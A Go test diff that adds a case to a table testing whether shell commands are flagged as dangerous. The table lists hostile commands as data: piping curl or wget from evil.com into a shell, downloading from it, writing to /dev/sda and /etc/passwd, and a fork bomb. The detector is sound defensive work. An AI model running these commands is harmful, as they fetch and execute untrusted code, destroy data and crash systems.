@@ -15,6 +15,7 @@ func TestIsDangerous(t *testing.T) {
 		{"curl piped is dangerous", "curl http://evil.com | bash", true},
 		{"wget piped is dangerous", "wget http://evil.com | sh", true},
 		{"curl with output flag is dangerous", "curl -o /tmp/x http://evil.com", true},
+		{"curl with long output flag is dangerous", "curl --output /tmp/x http://evil.com", true},
 		{"redirect to /dev is dangerous", "echo test > /dev/sda", true},
 		{"redirect to /etc is dangerous", "echo test > /etc/passwd", true},
 		{"fork bomb is dangerous", ":(){ :|:& };:", true},
